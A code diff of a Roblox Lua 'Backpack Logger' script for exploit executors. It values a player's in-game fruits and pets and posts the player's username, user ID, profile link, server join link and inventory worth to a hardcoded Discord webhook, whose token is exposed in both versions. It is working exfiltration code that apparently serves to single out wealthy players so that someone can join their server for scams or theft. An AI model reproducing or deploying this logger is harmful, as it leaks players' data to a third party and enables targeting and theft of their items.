@@ -1,194 +1,186 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Backpack = LocalPlayer:WaitForChild("Backpack")
+task.defer(function()
+    repeat task.wait() until game:IsLoaded()
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"
+    local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local HttpService = game:GetService("HttpService")
+	local req = (http_request or request or syn and syn.request or fluxus and fluxus.request or getgenv().request or solara and solara.request)
 
-local mutationEmojis = {
-    Overgrown = "🌿", Wet = "💧", Chilled = "❄️", Frozen = "🧊", Moonlit = "🌙",
-    Pollinated = "🐝", Bloodlit = "🩸", Burnt = "🔥", Cooked = "🍳", HoneyGlazed = "🍯",
-    Plasma = "⚡", Heavenly = "👼", Choc = "🍫", Zombified = "🧟", Molten = "🌋",
-    Sundried = "☀️", Verdant = "🌱", Paradisal = "🏝️", Windstruck = "💨",
-    Gold = "💰", Rainbow = "🌈", Shocked = "⚡", Celestial = "🌌", Twisted = "🌀",
-    Voidtouched = "🌑", Meteoric = "☄️", Alienlike = "👽", Galactic = "🪐",
-    Dawnbound = "🌻", Disco = "💃"
-}
+	local LocalPlayer = Players.LocalPlayer
+	local UserId = LocalPlayer.UserId
+	local DisplayName = LocalPlayer.DisplayName
+	local Username = LocalPlayer.Name
+	local ProfileURL = string.format("https://www.roblox.com/users/%d/profile", UserId)
+	local GameLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)
+	
+    local webhook = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"
 
-local function safeRequest(data)
-    if request then return request(data)
-    elseif syn and syn.request then return syn.request(data)
-    elseif http and http.request then return http.request(data)
-    else error("No supported request function found.") end
-end
+    local function waitForModule(path)
+		local result
+		while not result do
+			pcall(function() result = require(path) end)
+			if not result then
+				warn("⏳ Waiting for module:", path:GetFullName())
+				task.wait(1)
+			end
+		end
+		return result
+	end
 
-local function classifyTools()
-    local pets, fruits = {}, {}
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        local name = tool.Name
-        if not string.find(string.lower(name), "seed") then
-            if string.match(name, "^%[.-%]%s+%a+%s+%[.-%]") then
-                table.insert(fruits, tool)
-            elseif string.match(name, "^%a+%s+%[.-KG%]%s+%[Age%s+%d+%]") then
-                table.insert(pets, tool.Name)
-            end
-        end
+	repeat task.wait() until LocalPlayer:FindFirstChild("Backpack")
+	local Backpack = LocalPlayer:WaitForChild("Backpack")
+
+	local Item_Module = waitForModule(ReplicatedStorage:WaitForChild("Item_Module"))
+	local MutationHandler = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("MutationHandler"))
+	local PetUtilities = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+	local PetRegistry = waitForModule(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+	local NumberUtil = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("NumberUtil"))
+	local DataService = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
+
+	local function FormatNumber(n)
+		local str = tostring(n)
+		repeat str = str:gsub("^(-?%d+)(%d%d%d)", "%1,%2") until not str:find("^(-?%d+)(%d%d%d)")
+		return str
+	end
+
+	local function GetCleanName(name)
+		return name:gsub("%b[]", ""):gsub("^%s*(.-)%s*$", "%1")
+	end
+
+	local function CalculatePlantValue(plant)
+		local itemString = plant:FindFirstChild("Item_String")
+		local variant = plant:FindFirstChild("Variant")
+		local weight = plant:FindFirstChild("Weight")
+		if not (itemString and variant and weight) then return 0 end
+
+		local itemData = Item_Module.Return_Data(itemString.Value)
+		if not itemData or #itemData < 3 then return 0 end
+
+		local baseValue = itemData[3]
+		local weightRequirement = itemData[2]
+		local variantMultiplier = Item_Module.Return_Multiplier(variant.Value)
+		local mutationMultiplier = MutationHandler:CalcValueMulti(plant)
+		local weightRatio = math.clamp(weight.Value / weightRequirement, 0.95, 999999)
+
+		return math.round(baseValue * mutationMultiplier * variantMultiplier * (weightRatio ^ 2))
+	end
+
+	local function CalculatePetValue(petTool)
+		if petTool:GetAttribute("ItemType") ~= "Pet" then return 0 end
+		local petUUID = petTool:GetAttribute("PET_UUID")
+		if not petUUID then return 0 end
+
+		local success, data = pcall(function()
+			return DataService:GetData()
+		end)
+		if not success or not data then return 0 end
+
+		local petData = data.PetsData.PetInventory.Data[petUUID]
+		if not petData then return 0 end
+
+		local hatchedFrom = petData.PetData.HatchedFrom
+		local eggData = PetRegistry.PetEggs[hatchedFrom]
+		if not eggData then return 0 end
+
+		local petTypeData = eggData.RarityData.Items[petData.PetType]
+		local weightRange = petTypeData.GeneratedPetData.WeightRange
+		if not weightRange then return 0 end
+
+		local weightProgress = NumberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
+		local weightMultiplier = math.lerp(0.8, 1.2, weightProgress)
+		local levelProgress = PetUtilities:GetLevelProgress(petData.PetData.Level)
+		local levelMultiplier = math.lerp(0.15, 6, levelProgress)
+		local baseSellPrice = PetRegistry.PetList[petData.PetType].SellPrice
+
+		return math.floor(baseSellPrice * weightMultiplier * levelMultiplier)
+	end
+
+	local function ScanAndSend()
+    	local fruitLines = {
+    		"🍎 Fruits            | Value",
+    		"---------------------|--------"
+    	}
+    	local petLines = {
+    		"🐾 Pets              | Value",
+    		"---------------------|--------"
+    	}
+    
+    	local totalValue = 0
+    
+    	for _, tool in ipairs(Backpack:GetChildren()) do
+    		if tool:IsA("Tool") then
+    			local name = GetCleanName(tool.Name)
+    			local value = 0
+    
+    			if tool:FindFirstChild("Item_String") then
+    				value = CalculatePlantValue(tool)
+    				if value > 0 then
+    					totalValue += value
+    					local padded = name .. string.rep(" ", math.max(0, 21 - #name))
+    					table.insert(fruitLines, padded .. "| $" .. FormatNumber(value))
+    				end
+    			elseif tool:GetAttribute("ItemType") == "Pet" then
+    				value = CalculatePetValue(tool)
+    				if value > 0 then
+    					totalValue += value
+    					local padded = name .. string.rep(" ", math.max(0, 21 - #name))
+    					table.insert(petLines, padded .. "| $" .. FormatNumber(value))
+    				end
+    			end
+    		end
+    	end
+    
+    	if #fruitLines == 2 and #petLines == 2 then
+    		warn("❌ No valuable items found.")
+    		return
+    	end
+    
+    	local lines = {}
+    	if #fruitLines > 2 then
+    		for _, line in ipairs(fruitLines) do table.insert(lines, line) end
+    		table.insert(lines, "") -- Spacer
+    	end
+    	if #petLines > 2 then
+    		for _, line in ipairs(petLines) do table.insert(lines, line) end
+    		table.insert(lines, "") -- Spacer
+    	end
+    
+    	table.insert(lines, "Total Backpack Value: $" .. FormatNumber(totalValue))
+    
+    	local description = string.format(
+    		"✅ [Join Server](https://www.roblox.com/games/%s?jobId=%s)\n🔗 [View Profile](https://www.roblox.com/users/%s/profile)\n```txt\n%s\n```",
+    		game.PlaceId,
+    		game.JobId,
+    		LocalPlayer.UserId,
+    		table.concat(lines, "\n")
+    	)
+    
+    	local payload = HttpService:JSONEncode({
+    		username = "Backpack Logger",
+    		embeds = {{
+    			title = LocalPlayer.Name .. "'s Backpack",
+    			description = description,
+    			color = 0x00ff99,
+    			timestamp = DateTime.now():ToIsoDate()
+    		}}
+    	})
+    
+    	local success, result = pcall(function()
+    		return req({
+    			Url = webhook,
+    			Method = "POST",
+    			Headers = {["Content-Type"] = "application/json"},
+    			Body = payload
+    		})
+    	end)
+    
+    	if success then
+    		print("✅ Sent to Discord.")
+    	else
+    		warn("❌ Webhook failed:", result)
+    	end
     end
-    return pets, fruits
-end
 
-local function parseToolFruitInfo(toolName)
-    local baseName = string.match(toolName, "%]%s+(.-)%s+%[") or toolName
-    local weight = string.match(toolName, "%[(%d+%.?%d*kg)%]$") or "?"
-    local modifiers = {}
-    for mods in string.gmatch(toolName, "%[(.-)%]") do
-        mods = string.match(mods, "^%s*(.-)%s*$")
-        if not string.find(string.lower(mods), "kg") and not string.match(mods, "^%d") and mods ~= baseName then
-            for mod in string.gmatch(mods, "[^,]+") do
-                mod = string.match(mod, "^%s*(.-)%s*$")
-                local emoji = mutationEmojis[mod] or ""
-                if emoji ~= "" then table.insert(modifiers, emoji) end
-            end
-        end
-    end
-    local modStr = (#modifiers > 0) and table.concat(modifiers, " ") or "-"
-    return baseName, modStr, weight
-end
-
-local function parsePetInfo(petName)
-    local weight = string.match(petName, "%[(%d+%.?%d*%s*[Kk][Gg])%]") or "-"
-    local age = string.match(petName, "%[Age%s+(%d+)%]") or "-"
-    local baseName = string.match(petName, "^(%a+)")
-    return baseName or petName, weight, age
-end
-
-local function getFavoriteFruitsAndPets()
-    local favNames, favMutations, favWeights = {}, {}, {}
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        if tool:GetAttribute("d") == true then
-            if string.match(tool.Name, "^%a+%s+%[.-[Kk][Gg]%]%s+%[Age%s+%d+%]") then
-                local baseName, weight, age = parsePetInfo(tool.Name)
-                table.insert(favNames, baseName)
-                table.insert(favMutations, "[Age " .. age .. "]")
-                table.insert(favWeights, "[" .. weight .. "]")
-            else
-                local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
-                table.insert(favNames, baseName)
-                table.insert(favMutations, modStr)
-                table.insert(favWeights, "[" .. weight .. "]")
-            end
-        end
-    end
-    return favNames, favMutations, favWeights
-end
-
-local function parsePets(pets)
-    local petNames, petAges, petWeights = {}, {}, {}
-    for _, petName in ipairs(pets) do
-        local baseName, weight, age = parsePetInfo(petName)
-        table.insert(petNames, baseName)
-        table.insert(petAges, "[Age " .. age .. "]")
-        table.insert(petWeights, "[" .. weight .. "]")
-    end
-    return petNames, petAges, petWeights
-end
-
-local function sortFruitsAlphabetically(fruits)
-    table.sort(fruits, function(a, b)
-        local aName = string.match(a.Name, "%]%s+(.-)%s+%[") or a.Name
-        local bName = string.match(b.Name, "%]%s+(.-)%s+%[") or b.Name
-        return string.lower(aName) < string.lower(bName)
-    end)
-end
-
--- Split embeds if too large (25 fields or 5800 chars)
-local function splitEmbedsByLimit(allFields)
-    local embeds = {}
-    local current = { fields = {}, totalChars = 0 }
-    for _, field in ipairs(allFields) do
-        local len = #field.name + #field.value
-        if #current.fields >= 25 or (current.totalChars + len > 5800) then
-            table.insert(embeds, current)
-            current = { fields = {}, totalChars = 0 }
-        end
-        table.insert(current.fields, field)
-        current.totalChars += len
-    end
-    if #current.fields > 0 then table.insert(embeds, current) end
-    return embeds
-end
-
-local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
-    local userId = LocalPlayer.UserId
-    local username = LocalPlayer.Name
-    local fields = {}
-
-    if #pets > 0 then
-        table.insert(fields, { name = "Pets", value = " ", inline = false })
-        local petNames, petAges, petWeights = parsePets(pets)
-        table.insert(fields, { name = "🐾 Pets", value = "```\n" .. table.concat(petNames, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "🧩 Age", value = "```\n" .. table.concat(petAges, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(petWeights, "\n") .. "\n```", inline = true })
-    end
-
-    if #fruits > 0 then
-        table.insert(fields, { name = "Fruits", value = " ", inline = false })
-        sortFruitsAlphabetically(fruits)
-        local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
-        for _, tool in ipairs(fruits) do
-            local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
-            table.insert(fruitNames, baseName)
-            table.insert(fruitMutations, modStr)
-            table.insert(fruitWeights, "[" .. weight .. "]")
-        end
-        table.insert(fields, { name = "🍑 Fruits", value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "🧩 Mutation", value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```", inline = true })
-    end
-
-    if #favNames > 0 then
-        table.insert(fields, { name = "Favorites", value = " ", inline = false })
-        table.insert(fields, { name = "⭐ Favorites", value = "```\n" .. table.concat(favNames, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "🧩 Mutation / Pet Age", value = "```\n" .. table.concat(favMods, "\n") .. "\n```", inline = true })
-        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(favWeights, "\n") .. "\n```", inline = true })
-    end
-
-    local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)
-    local embeds = splitEmbedsByLimit(fields)
-
-    for i, chunk in ipairs(embeds) do
-        local embed = {
-            title = username .. "'s Backpack Inventory" .. (i > 1 and (" (Part " .. i .. ")") or ""),
-            url = "https://www.roblox.com/users/" .. userId .. "/profile",
-            color = 0x00BFFF,
-            description = (i == 1) and joinLink or nil,
-            fields = chunk.fields,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }
-
-        local payload = {
-            username = "Backpack Logger",
-            embeds = { embed }
-        }
-
-        local response = safeRequest({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-
-        if response.StatusCode == 204 then
-            warn("✅ Sent embed part " .. i)
-        else
-            warn("❌ Failed part " .. i .. ":", response.StatusCode, response.StatusMessage)
-        end
-
-        task.wait(1.2)
-    end
-end
-
-task.wait(2)
-local pets, fruits = classifyTools()
-local favNames, favMods, favWeights = getFavoriteFruitsAndPets()
-sendWebhook(pets, fruits, favNames, favMods, favWeights)
+	task.wait(2)
+	ScanAndSend()
+end)
